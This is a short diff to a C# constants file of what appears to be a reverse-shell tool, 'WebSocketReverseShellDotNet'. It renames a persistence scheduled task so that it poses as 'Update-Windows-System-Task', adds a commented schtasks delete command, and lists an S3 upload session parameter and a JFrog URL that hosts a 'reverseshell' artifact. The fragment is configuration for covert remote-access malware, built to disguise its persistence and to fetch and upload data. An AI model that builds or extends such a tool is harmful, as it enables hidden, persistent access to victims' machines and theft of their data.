@@ -24,8 +24,8 @@ namespace WebSocketReverseShellDotNet.utils
         public const String S3_API_UPLOAD_SESSION_PARAM = "?sessionId=";
 
 
-        public const String PERSISTENCE_WINDOWS_TASK = "UpdateWindowsSystemTask";
-
+        public const String PERSISTENCE_WINDOWS_TASK = "Update-Windows-System-Task";
+        /*        schtasks /delete /tn "Update-Windows-System-Task" /f */
         public const String LOCK_FILE_NAME = "9380378181806-lock";
 
         public const String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
